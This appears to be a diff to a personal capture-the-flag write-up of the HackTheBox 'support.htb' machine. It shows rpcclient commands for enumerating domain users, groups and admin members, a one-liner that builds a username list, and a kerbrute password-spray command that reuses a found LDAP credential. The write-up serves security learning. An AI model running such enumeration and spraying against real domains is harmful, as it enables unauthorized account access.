@@ -203,4 +203,42 @@ rpcclient 10.10.11.174 -U 'support.htb/ldap%nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz
 >[!example]- Result
 >![[Pasted image 20250225150800.png]]
 
-- we have access, so we can enumerate
+- we have access, so we can enumerate some things like:
+ Users: `enumdomusers`:
+>[!example]- Result 
+>![[Pasted image 20250225151506.png]]
+``
+
+Display all users information: `querydispinfo`:
+>[!example]- Result
+>![[Pasted image 20250225152913.png]]
+>In some cases we can find useful information
+
+Groups: `enumdomgroups`:
+>[!example]- Result
+>![[Pasted image 20250225151955.png]]
+
+Get user members of 'domain admins' group: `querygroupmem 0x200`:
+>[!example]- Result
+>![[Pasted image 20250225152453.png]]
+
+Get user from "RID": `queryuser 0x1f4`:
+>[!example]- Result
+>![[Pasted image 20250225152559.png]]
+
+- We dont see nothing especial, so lets make a valid users list in order to preform a brute forcing attack
+```bash
+rpcclient 10.10.11.174 -U 'support.htb/ldap%nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -c 'enumdomusers' | grep -oP '\[.*?\]' | grep -vE '0x*' | tr -d '[]' > usernames
+```
+>[!example]- Result
+>![[Pasted image 20250225153505.png]]
+
+### Password Spraying 
+- we can try to reuse the found creadential in all users usin [[kerbrute]] (same result using [[crackmapexec]])
+```bash
+kerbrute_linux_amd64 passwordspray usernames 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' --dc 10.10.11.174 -d support.htb
+```
+>[!example]- Result
+>![[Pasted image 20250225154148.png]]
+
+###
